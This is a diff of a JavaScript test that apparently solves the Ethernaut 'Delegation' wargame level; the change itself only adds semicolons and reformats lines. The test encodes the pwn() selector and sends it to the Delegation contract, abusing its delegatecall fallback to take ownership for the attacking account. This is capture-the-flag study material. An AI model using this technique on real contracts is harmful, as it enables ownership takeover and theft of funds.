@@ -29,17 +29,17 @@ describe("Delegation", () => {
   });
 
   it("initiates hack", async () => {
-    console.log("Calculating function signature of pwn() in Delegate")
+    console.log("Calculating function signature of pwn() in Delegate");
     const interface = new ethers.utils.Interface(["function pwn()"]);
     const functionSig = interface.encodeFunctionData("pwn");
-    console.log("function signature : ", functionSig)
+    console.log("function signature : ", functionSig);
     console.log("initiating hack!");
     const tx = await hacker.sendTransaction({
-        to: delegation.address,
-        data: functionSig,
-        gasLimit: 100000,
-      });
-    await tx.wait()
+      to: delegation.address,
+      data: functionSig,
+      gasLimit: 100000,
+    });
+    await tx.wait();
     util.updateTotalSolved(scriptName);
   });
 });
